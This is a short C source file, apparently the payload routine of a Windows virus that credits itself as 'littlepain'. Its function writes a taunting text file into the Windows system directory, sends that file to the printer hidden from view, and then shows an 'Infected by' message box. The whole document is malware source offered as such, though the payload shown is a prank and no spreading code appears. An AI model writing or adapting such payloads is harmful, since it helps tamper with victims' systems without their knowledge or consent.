#include "data_globals.h"
#include <windows.h>
#include <shellapi.h>   // added for ShellExecuteA
#include <string.h>

void _Payload(void)
{
    CHAR flag_path[MAX_PATH];
    HANDLE flag_fd;
    DWORD written;

    GetWindowsDirectoryA(flag_path, MAX_PATH);
    strcat(flag_path, "\\MSG_FOR_YOU.txt");

    flag_fd = CreateFileA(flag_path, GENERIC_WRITE, FILE_SHARE_WRITE,
                          NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    if (flag_fd != INVALID_HANDLE_VALUE)
    {
        WriteFile(flag_fd, "Dear user, your system needs some security improvements!",
                  56, &written, NULL);
        CloseHandle(flag_fd);
        ShellExecuteA(NULL, "print", flag_path, NULL, NULL, SW_HIDE);
        MessageBoxA(NULL, "Infected by littlepain by [WarGame,#eof] ( italian guy )", "Credits",
                    MB_OK | MB_ICONINFORMATION);
    }
}
